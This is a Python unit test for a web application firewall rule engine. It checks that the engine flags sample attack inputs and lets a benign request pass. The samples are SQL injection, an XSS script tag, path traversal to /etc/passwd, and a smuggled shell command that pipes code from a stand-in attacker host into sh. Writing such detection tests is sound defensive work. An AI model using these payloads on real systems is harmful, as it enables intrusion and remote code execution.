import sys
import os

# Add backend root to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.rules.rule_engine import rule_engine

def test_waf_rules():
    # 1. Test SQL Injection matching
    sql_payload = "SELECT * FROM users WHERE username = 'admin' OR '1'='1';"
    result = rule_engine.inspect_request("GET", "/login", {}, f"q={sql_payload}", "")
    assert result["matched"] == True, "Failed to match SQL injection query."
    assert any(r["category"] == "Injection" for r in result["rules"]), "Wrong category matched."
    print("OK: SQL Injection rule matched successfully.")

    # 2. Test XSS Script matching
    xss_payload = "<script>alert(1)</script>"
    result = rule_engine.inspect_request("POST", "/comment", {}, "", xss_payload)
    assert result["matched"] == True, "Failed to match XSS payload."
    assert any(r["category"] == "XSS" for r in result["rules"]), "Wrong category matched."
    print("OK: XSS script tag matched successfully.")

    # 3. Test Path Traversal matching
    traversal_payload = "../../../../etc/passwd"
    result = rule_engine.inspect_request("GET", "/files", {}, f"file={traversal_payload}", "")
    assert result["matched"] == True, "Failed to match Path Traversal."
    print("OK: Path Traversal matched successfully.")

    # 4. Test RCE Shell commands
    rce_payload = "; curl http://attacker.com/malware | sh"
    result = rule_engine.inspect_request("POST", "/run", {}, "", rce_payload)
    assert result["matched"] == True, "Failed to match RCE shell command."
    print("OK: Remote Code Execution threat matched successfully.")

    # 5. Test Benign request passes safely
    result = rule_engine.inspect_request("GET", "/items", {"Accept": "application/json"}, "page=2&limit=10", "")
    assert result["matched"] == False, "False positive on benign request."
    print("OK: Benign request bypassed rules successfully.")

if __name__ == "__main__":
    print("Running WAF signature engine unit tests...")
    try:
        test_waf_rules()
        print("\nAll tests completed successfully. Threat engine is fully operational!")
    except AssertionError as e:
        print(f"\nVerification test failed: {e}")
        sys.exit(1)
